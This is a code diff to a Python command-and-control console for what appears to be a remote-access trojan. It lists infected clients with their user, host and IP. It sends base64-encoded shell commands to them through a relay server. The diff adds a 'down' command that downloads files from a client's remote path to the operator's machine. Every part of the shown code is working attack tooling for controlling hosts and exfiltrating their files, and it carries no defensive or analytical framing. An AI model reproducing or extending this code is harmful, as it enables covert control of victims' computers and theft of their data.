@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 import os
+import re
 import time
 import random
 import base64
+import hashlib
 import logging
 import requests
 import datetime
@@ -41,16 +43,28 @@ class Server(object):
     print(base64.b64decode(Server.SHELL_BANNER.encode('UTF-8')).decode('UTF-8'))
     logging.info('type "help" for a list of commands')
 
-  def _transfer(self, uuid, data):
-    # split data into chunks
-    chunks = [data[i:i + Server.CHUNK_SIZE] for i in range(0, len(data), Server.CHUNK_SIZE)]
-    logging.info(f'sending {len(chunks)} data chunks to client ...')
-    for i in range(len(chunks)):
+  def _isUUID(self, uuid):
+    # https://www.ietf.org/rfc/rfc4122.txt
+    return re.findall(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$',uuid)
+
+  def _transfer(self, uuid, prefix, data):
+    # send prefix first if defined
+    if prefix:
       while True:
-        logging.debug(f'sending chunk {i} ...')
-        r = requests.post(self.srv, data={'k':self.key,'u':uuid,'d':chunks[i]})
+        logging.debug('sending prefix ...')
+        r = requests.post(self.srv, data={'k':self.key,'u':uuid,'d':prefix})
         if r.ok:
           break
+    # split data into chunks
+    chunks = [data[i:i + Server.CHUNK_SIZE] for i in range(0, len(data), Server.CHUNK_SIZE)]
+    if chunks:
+      logging.info(f'sending {len(chunks)} data chunks to client ...')
+      for i in range(len(chunks)):
+        while True:
+          logging.debug(f'sending chunk {i} ...')
+          r = requests.post(self.srv, data={'k':self.key,'u':uuid,'d':chunks[i]})
+          if r.ok:
+            break
     # signal all chunks sent
     while True:
       logging.debug('sending NULL chunk ...')
@@ -93,10 +107,10 @@ class Server(object):
     print('up <uuid> <local> <remote> - upload a local file for a given uuid to a remote path')
     print('q                          - exit')
 
-  def get_client_info(self, uuid):
-    if not uuid:
-      logging.error(f'missing client UUID: {uuid}')
-      return None
+  def server_client_info(self, uuid):
+    if not self._isUUID(uuid):
+      logging.error(f'bad client UUID: {uuid}')
+      return
     logging.info(f'fetching client info for {uuid} ...')
     r = requests.get(self.srv, params={'k':self.key,'u':uuid,'d':'info'})
     if r.status_code != requests.codes.ok:
@@ -120,7 +134,7 @@ class Server(object):
     logging.success(f"[{result['uuid']}][{result['date']}][{result['state']}] {result['user']}@{result['host']} ({result['ip']})")
     return result
 
-  def list_clients(self):
+  def server_list_clients(self):
     r = requests.get(self.srv, params={'k':self.key,'d':'lsc'})
     if r.status_code != requests.codes.ok:
       logging.error(f'failed to execute "ls" server command. response: {r.status_code}')
@@ -134,9 +148,25 @@ class Server(object):
       if not raw:
         logging.warning('no hosts found?')
 
-  def shell(self, uuid):
-    if not uuid:
-      logging.error(f'missing client UUID: {uuid}')
+  def client_download(self, uuid, remote_path):
+    if not self._isUUID(uuid):
+      logging.error(f'bad client UUID: {uuid}')
+      return
+    logging.info(f'downloading file from {remote_path} ...')
+    prefix = f"{Server.CLIENT_DOWNLOAD}|{base64.b64encode(remote_path.encode('UTF-8')).decode('UTF-8')}"
+    encoded_data = self._transfer(uuid=uuid, prefix=prefix, data='')
+    # write to local file
+    sha1 = hashlib.sha1()
+    logging.info(f'writing result to {os.path.basename(remote_path)} ...')
+    with open(os.path.basename(remote_path),'wb') as f:
+      raw = base64.b64decode(encoded_data)
+      f.write(raw)
+      sha1.update(raw)
+    logging.success(f'file SHA-1 hash: {sha1.hexdigest()}')
+
+  def client_shell(self, uuid):
+    if not self._isUUID(uuid):
+      logging.error(f'bad client UUID: {uuid}')
       return
     logging.info(f'starting shell with {uuid} ...')
     logging.info('enter "quit" to exit')
@@ -147,7 +177,7 @@ class Server(object):
         break
       if cmd.strip():
         encoded_cmd = f"{Server.CLIENT_EXECUTE}|{base64.b64encode(cmd.encode('UTF-8')).decode('UTF-8')}"
-        raw = self._transfer(uuid, encoded_cmd)
+        raw = self._transfer(uuid=uuid, prefix='', data=encoded_cmd)
         print(base64.b64decode(raw).decode('UTF-8'))
 
 
@@ -170,20 +200,25 @@ if __name__ == '__main__':
   srv = Server(args.server_url, args.master_key)
   # accept user input for hosts
   while True:
-    args = input('> ').lower().split()
+    args = input('> ').split()
     if args[0] == 'q':
       break
     elif args[0] == 'lsc':
-      srv.list_clients()
+      srv.server_list_clients()
     elif args[0] == 'info':
       if len(args) != 2:
-        logging.error('missing client UUID')
+        logging.error('missing arguments')
         continue
-      srv.get_client_info(args[1])
+      srv.server_client_info(args[1])
+    elif args[0] == 'down':
+      if len(args) != 3:
+        logging.error('missing arguments')
+        continue
+      srv.client_download(args[1], args[2])
     elif args[0] == 'shell':
       if len(args) != 2:
         logging.error('missing client UUID')
         continue
-      srv.shell(args[1])
+      srv.client_shell(args[1])
     else:
       srv.help()
